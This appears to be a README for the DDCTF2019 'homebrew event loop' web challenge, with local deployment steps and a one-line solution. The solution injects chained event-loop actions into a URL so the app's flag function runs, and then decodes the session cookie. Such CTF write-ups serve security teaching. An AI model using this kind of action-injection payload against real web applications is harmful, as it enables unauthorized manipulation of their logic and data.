# [DDCTF2019 Web] homebrew event loop

## Deployment

`$ python eventLoop.py` (python 2.7)    

then visit http://127.0.0.1:5000/d5afe1f66747e857/

## Solution

final payload: `/d5afe1f66747e857/?action:trigger_event%23;action:buy;5%23action:get_flag;`    

then decode the cookie using `decodeCookie.py`

## Related Challenges

`*ctf 2019` (a.k.a starctf 2019) `homebrewEvtLoop--`(stage 1) and `homebrewEvtLoop#`(stage 2)